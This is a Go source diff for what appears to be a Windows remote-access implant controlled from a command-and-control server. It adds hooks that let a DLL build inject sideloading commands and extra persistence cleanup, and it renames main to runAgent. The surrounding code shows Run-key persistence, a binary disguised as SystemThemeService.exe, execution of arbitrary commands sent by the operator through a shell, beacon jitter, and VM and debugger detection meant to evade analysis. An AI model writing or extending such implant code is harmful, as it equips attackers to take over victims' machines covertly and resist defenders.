@@ -1624,6 +1624,12 @@ func getFolderTree() string {
 // PERSISTENCE
 // ================================================================
 
+// Hooks set by DLL build (dll_sideload.go init) — nil in EXE build.
+// Keeps all DLL/LOLBAS-specific strings out of the EXE binary.
+var extraPersistCleanup func()
+var extraOptionsText func() string
+var extraCommandHandler func(cmd string) (result string, handled bool)
+
 func addPersistence() string {
 	exePath, err := os.Executable()
 	if err != nil {
@@ -1654,6 +1660,10 @@ func removePersistence() string {
 	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder")
 	legacyPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
 	os.Remove(legacyPath)
+	// DLL build sets this hook to clean up sideloaded DLL + startup persistence
+	if extraPersistCleanup != nil {
+		extraPersistCleanup()
+	}
 	return "Persistence removed"
 }
 
@@ -2031,6 +2041,9 @@ CONTROL
   ping           - Connection test
   sleep          - Sleep N seconds (args: seconds)
   exit           - Terminate client`
+	if extraOptionsText != nil {
+		return base + "\n" + extraOptionsText()
+	}
 	return base
 }
 
@@ -2297,6 +2310,13 @@ func handleCommand(c2 *C2Client, jm *JobManager, cmd Command) {
 		os.Exit(0)
 
 	default:
+		// DLL build injects extra commands (sideload, unsideload)
+		if extraCommandHandler != nil {
+			if r, handled := extraCommandHandler(cmd.Command); handled {
+				result = r
+				break
+			}
+		}
 		// Try executing as raw shell command
 		out, err := shellExec(cmd.Command + " " + cmd.Args)
 		if err != nil {
@@ -2338,7 +2358,7 @@ func jitteredSleep(base time.Duration, jitterPct int) {
 // MAIN
 // ================================================================
 
-func main() {
+func runAgent() {
 	// Anti-analysis: exit if non-VMware VM or debugger detected.
 	// VMware-only triggers are treated as false positives (host has VMware installed).
 	vmDetected, vmTriggers := detectVMDetails()
